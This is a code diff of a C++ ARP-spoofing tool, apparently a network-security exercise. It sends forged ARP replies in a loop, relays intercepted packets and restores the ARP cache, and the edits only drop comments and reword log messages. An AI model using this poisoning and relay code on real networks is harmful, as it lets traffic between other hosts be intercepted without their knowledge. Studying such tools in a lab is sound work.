@@ -59,12 +59,12 @@ void *packet_handler(void *arg)
     libnet_ethernet_hdr* eth_header = (libnet_ethernet_hdr*)send_buf;
     custom_arp_hdr* arp_header = (custom_arp_hdr*)(send_buf + sizeof(libnet_ethernet_hdr));
 
-    eth_header->ether_dhost[0] = 0xff; //0x00;
-    eth_header->ether_dhost[1] = 0xff; //0x0c;
-    eth_header->ether_dhost[2] = 0xff; //0x29;
-    eth_header->ether_dhost[3] = 0xff; //0x91;
-    eth_header->ether_dhost[4] = 0xff; //0x57;
-    eth_header->ether_dhost[5] = 0xff; //0x56;
+    eth_header->ether_dhost[0] = 0xff;
+    eth_header->ether_dhost[1] = 0xff;
+    eth_header->ether_dhost[2] = 0xff;
+    eth_header->ether_dhost[3] = 0xff;
+    eth_header->ether_dhost[4] = 0xff;
+    eth_header->ether_dhost[5] = 0xff;
 
     eth_header->ether_shost[0] = 0x00;
     eth_header->ether_shost[1] = 0x0c;
@@ -93,28 +93,28 @@ void *packet_handler(void *arg)
     arp_header->ar_sip[2] = 0xa2;
     arp_header->ar_sip[3] = 0x02;
 
-    arp_header->ar_tha[0] = 0xff; //0x00;
-    arp_header->ar_tha[1] = 0xff; //0x0c;
-    arp_header->ar_tha[2] = 0xff; //0x29;
-    arp_header->ar_tha[3] = 0xff; //0x91;
-    arp_header->ar_tha[4] = 0xff; //0x57;
-    arp_header->ar_tha[5] = 0xff; //0x56;
+    arp_header->ar_tha[0] = 0xff;
+    arp_header->ar_tha[1] = 0xff;
+    arp_header->ar_tha[2] = 0xff;
+    arp_header->ar_tha[3] = 0xff;
+    arp_header->ar_tha[4] = 0xff;
+    arp_header->ar_tha[5] = 0xff;
 
-    arp_header->ar_tip[0] = 0xff; //0xc0;
-    arp_header->ar_tip[1] = 0xff; //0xa8;
-    arp_header->ar_tip[2] = 0xff; //0xa2;
-    arp_header->ar_tip[3] = 0xff; //0x84;
+    arp_header->ar_tip[0] = 0xff;
+    arp_header->ar_tip[1] = 0xff;
+    arp_header->ar_tip[2] = 0xff;
+    arp_header->ar_tip[3] = 0xff;
 
     for(int i = 42; i <= 59; i++) send_buf[i] = 0x00;
 
     while(1){
         if(pcap_sendpacket(handle_th, (u_char*)send_buf, (sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18)) != 0)
-            std::cout<<"arp error\n";
+            std::cout<<"Arp packet error\n";
 
         else{
             for(int i = 0; i < (int)(sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18); i++) printf("%02x ", send_buf[i]);
 
-            std::cout<<"arp send\n";
+            std::cout<<"Arp packet send\n";
         }
 
         sleep(1);
@@ -153,10 +153,10 @@ int main()
     }
 
     if(pthread_create(&packet_threads, NULL, packet_handler, (void*)NULL) < 0)
-        std::cout<<"Thread error";
+        std::cout<<"Packet thread error";
 
     if(pthread_create(&recovery_threads, NULL, recovery_handler, (void*)NULL) < 0)
-        std::cout<<"Thread error";
+        std::cout<<"Recovery thread error";
 
     while(1){
         const u_char *p;
@@ -179,9 +179,9 @@ int main()
                 eth_check->ether_dhost[4] = 0x33;
                 eth_check->ether_dhost[5] = 0x65;
 
-                if(pcap_sendpacket(handle, (u_char*)p, h->len) != 0) std::cout<<"relay error\n";
+                if(pcap_sendpacket(handle, (u_char*)p, h->len) != 0) std::cout<<"Relay error\n";
 
-                else std::cout<<"relay packet\n";
+                else std::cout<<"Relay packet\n";
             }
         }
 
@@ -241,7 +241,7 @@ int main()
     for(int i = 42; i <= 59; i++) recovery_buf[i] = 0x00;
 
     if(pcap_sendpacket(handle, (u_char*)recovery_buf, (sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18)) != 0)
-        std::cout<<"recovery error\n";
+        std::cout<<"Recovery error\n";
 
-    else std::cout<<"recovery arp cache\n";
+    else std::cout<<"Recovery arp cache\n";
 }
